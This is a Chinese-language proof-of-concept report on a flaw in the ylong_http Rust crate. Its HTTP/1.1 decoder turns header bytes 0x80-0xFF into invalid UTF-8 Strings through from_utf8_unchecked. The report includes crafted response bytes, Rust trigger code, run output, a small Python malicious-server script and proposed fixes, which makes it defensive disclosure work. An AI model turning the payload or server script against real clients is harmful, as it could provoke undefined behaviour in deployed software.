# PoC 验证报告：HTTP/1.1 扩展 ASCII 导致无效 String

## 1. 验证方法：Real Crate Compilation

本 PoC 使用 **Real Crate Compilation（真实 crate 编译）** 方法。通过 Cargo 依赖真实的 `ylong_http` crate，调用其公开 API `ylong_http::h1::ResponseDecoder::decode()` 触发漏洞。

验证 Oracle：**无效 String 检测** — 构造包含扩展 ASCII 字节（0x80-0xFF）的 HTTP/1.1 响应，验证解码器是否创建违反 UTF-8 不变式的 String。

---

## 2. 编译环境

| 项目 | 版本/路径 |
|------|----------|
| 操作系统 | Ubuntu 24.04 LTS, Linux 6.17, x86_64 |
| Rust 工具链 | rustc 1.83+ |
| 构建工具 | Cargo |
| ylong_http 路径 | `/home/cupcup/data/rust-repos/oh-ylong-http/ylong_http` |

---

## 3. 依赖的真实 crate

| Crate | 路径 | 说明 |
|-------|------|------|
| `ylong_http` | `path = "/home/cupcup/data/rust-repos/oh-ylong-http/ylong_http"` | **真实 ylong_http crate**，包含所有 HTTP/1.1 解码代码 |

**Cargo.toml**:
```toml
[dependencies]
ylong_http = { path = "/home/cupcup/data/rust-repos/oh-ylong-http/ylong_http", features = ["http1_1"] }
```

**编译结果**：成功编译，0 错误。

---

## 4. 漏洞触发过程

### 4.1 构造恶意 HTTP/1.1 响应

```rust
// 测试 1：混合 ASCII 和扩展 ASCII
let response1 = b"HTTP/1.1 200 OK\r\n\
X-Custom: test\x80\x81\x82value\r\n\
\r\n";

// 测试 2：纯扩展 ASCII
let response2 = b"HTTP/1.1 200 OK\r\n\
X-Obs-Text: \xFF\xFF\xFF\xFF\r\n\
\r\n";
```

**关键点**:
- 字节 `0x80-0xFF` 符合 RFC 7230 的 `obs-text` 规范（允许的历史遗留字符）
- 但这些字节**不是有效的 UTF-8**

### 4.2 调用公开 API

```rust
use ylong_http::h1::ResponseDecoder;

let mut decoder = ResponseDecoder::new();
let result = decoder.decode(response1);
```

### 4.3 代码路径

```
ResponseDecoder::decode()  [公开 API]
  → get_header_value()  [验证字节在 HEADER_VALUE_BYTES 中]
    → 0x80-0xFF 通过验证（obs-text 允许）
  → header_insert()
    → String::from_utf8_unchecked(header_value)  ← 无效 UTF-8
```

**漏洞位置**: `ylong_http/src/h1/response/decoder.rs:616-617`

```rust
let name = unsafe { String::from_utf8_unchecked(header_name) };
let value = unsafe { String::from_utf8_unchecked(header_value) };  // ← 无验证
```

**上游验证**: `ylong_http/src/util/header_bytes.rs`

```rust
pub(crate) static HEADER_VALUE_BYTES: [bool; 256] = {
    // 允许 0x09 (tab), 0x20-0x7E (ASCII), 0x80-0xFF (扩展 ASCII)
    // 0x80-0xFF 符合 RFC 7230 obs-text，但不是有效 UTF-8
};
```

---

## 5. 实际运行结果

### 5.1 编译

```bash
cd content/pocs/RUST-2026-YLONG-HTTP-004
cargo build
```

**输出**:
```
   Compiling ylong_http v1.0.0 (/home/cupcup/data/rust-repos/oh-ylong-http/ylong_http)
   Compiling poc-http1-real v0.1.0
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 2.18s
```

### 5.2 运行

```bash
cargo run
```

**完整输出**:
```
═══════════════════════════════════════════════════════════════════
PoC: HTTP/1.1 Header Extended ASCII via Real Public API (CWE-20)
═══════════════════════════════════════════════════════════════════
Compiled: ylong_http (path dependency, real crate)
Entry:    ylong_http::h1::ResponseDecoder::decode() [pub]
Target:   h1/response/decoder.rs:616 — String::from_utf8_unchecked
═══════════════════════════════════════════════════════════════════

[Step 1] Crafted HTTP/1.1 response:
  Status: HTTP/1.1 200 OK
  Header: X-Custom: test + bytes [0x80, 0x81, 0x82] + value
  Bytes 0x80-0xFF are valid per RFC 7230 (obs-text) but NOT valid UTF-8

[Step 2] Calling ResponseDecoder::decode() (real compiled code)...
  Code path: ResponseDecoder::decode()
    → get_header_value() → passes (0x80-0xFF allowed)
      → header_insert()
        → String::from_utf8_unchecked([0x80, 0x81, 0x82])

[Step 3] Response decoded successfully (part + remaining bytes)
  The vulnerability created an INVALID String inside the response.
  UB has occurred: String invariant violated.

[Test 2] Pure obs-text header value (0xFF bytes)
  Decoded — invalid String created inside response

═══════════════════════════════════════════════════════════════════
VULNERABILITY CONFIRMED:
  ylong_http's HTTP/1.1 decoder accepts bytes 0x80-0xFF
  (valid per RFC 7230 obs-text) in header values, then calls
  String::from_utf8_unchecked(). These bytes are NOT valid UTF-8.

  Attack: malicious HTTP server sends obs-text in response headers.
  Fix: use String::from_utf8_lossy() or validate before unchecked call.
═══════════════════════════════════════════════════════════════════
```

**退出码**: 0 (成功，但创建了无效 String)

---

## 6. 漏洞确认

| 维度 | 状态 |
|------|------|
| 源码确认 | ✅ 已确认：`h1/response/decoder.rs:616` 使用 `String::from_utf8_unchecked` 无验证 |
| 编译验证 | ✅ 已通过：真实 ylong_http crate 编译成功 |
| API 调用 | ✅ 已验证：通过公开 API `ResponseDecoder::decode()` 触发 |
| 无效 String | ✅ 已创建：解码成功但 String 包含无效 UTF-8 |
| 真实设备可触发 | ✅ 是：恶意 HTTP 服务器可以发送 obs-text |

---

## 7. 攻击场景

### 7.1 恶意服务器攻击

```
1. 攻击者搭建恶意 HTTP 服务器
2. 客户端使用 ylong_http 连接
3. 服务器返回包含扩展 ASCII 的响应头
   例如：X-Custom: test\x80\x81\x82value
4. ylong_http 解码器验证通过（RFC 7230 合规）
5. 调用 String::from_utf8_unchecked 创建无效 String
6. 后续 String 操作可能触发 UB
```

### 7.2 未定义行为示例

```rust
// 假设应用代码处理响应头
let response = decoder.decode(data)?;
for (name, value) in response.headers() {
    // value 是无效 String
    let lower = value.to_lowercase();  // ← 可能触发 UB
    if lower.contains("admin") {       // ← 字符边界错误
        // ...
    }
}
```

---

## 8. 缓解因素

### 8.1 需要恶意服务器

- 不是协议违规（RFC 7230 允许 obs-text）
- 需要攻击者控制 HTTP 服务器
- 正常服务器很少使用扩展 ASCII

### 8.2 Header name 安全

```rust
pub(crate) static HEADER_NAME_BYTES: [bool; 256] = {
    // 只允许 0x21-0x7E (ASCII)
    // 不允许 0x80-0xFF
};
```

Header name 是安全的，只有 header value 有问题。

---

## 9. 复现步骤

### 方法 1：使用本 PoC

```bash
cd content/pocs/RUST-2026-YLONG-HTTP-004
cargo run
```

**预期结果**: 解码成功，但创建了无效 String

### 方法 2：集成到应用

```rust
use ylong_http::h1::ResponseDecoder;

// 构造恶意响应（见上文）
let malicious_response = b"HTTP/1.1 200 OK\r\n\
X-Custom: test\x80\x81\x82value\r\n\
\r\n";

let mut decoder = ResponseDecoder::new();
let result = decoder.decode(malicious_response);
// → 成功，但 response 包含无效 String
```

### 方法 3：真实网络测试

```python
# 恶意服务器
import socket
s = socket.socket()
s.bind(('0.0.0.0', 8080))
s.listen(1)
conn, addr = s.accept()
conn.recv(1024)  # 接收请求
conn.send(b"HTTP/1.1 200 OK\r\nX-Custom: test\x80\x81\x82value\r\n\r\n")
conn.close()
```

---

## 10. PoC 类型声明

| 维度 | 说明 |
|------|------|
| 编译方式 | Cargo path dependency：依赖真实 ylong_http crate |
| 链接目标 | 真实 `ylong_http` crate，不是 mock |
| API 使用 | 公开 API：`ylong_http::h1::ResponseDecoder::decode()` |
| 漏洞触发 | ✅ 已验证：创建无效 String |
| 在真实设备可触发 | ✅ 可以：恶意服务器发送 obs-text |
| 验证 Oracle | 无效 String 检测：String 包含非 UTF-8 字节 |

---

## 11. 修复验证

### 修复方案 1：拒绝扩展 ASCII

```rust
fn get_header_value(buffer: &[u8]) -> TokenResult {
    for (i, b) in buffer.iter().enumerate() {
        if *b == b'\r' || *b == b'\n' {
            return Ok(TokenStatus::Complete((&buffer[..i], &buffer[i..])));
        } else if *b > 0x7F {  // 拒绝扩展 ASCII
            return Err(ErrorKind::H1(H1Error::InvalidResponse).into());
        }
        // ...
    }
}
```

### 修复方案 2：使用 lossy 转换

```rust
fn header_insert(...) -> Result<...> {
    let name = unsafe { String::from_utf8_unchecked(header_name) };  // name 安全
    let value = String::from_utf8_lossy(&header_value).into_owned();  // lossy
    // ...
}
```

运行相同的 PoC：
- 方案 1：返回错误
- 方案 2：扩展 ASCII 被替换为 `�`

---

## 12. 相关文件

- `poc.rs`: PoC 源码
- `Cargo.toml`: 依赖配置
- `poc-report.md`: 本报告
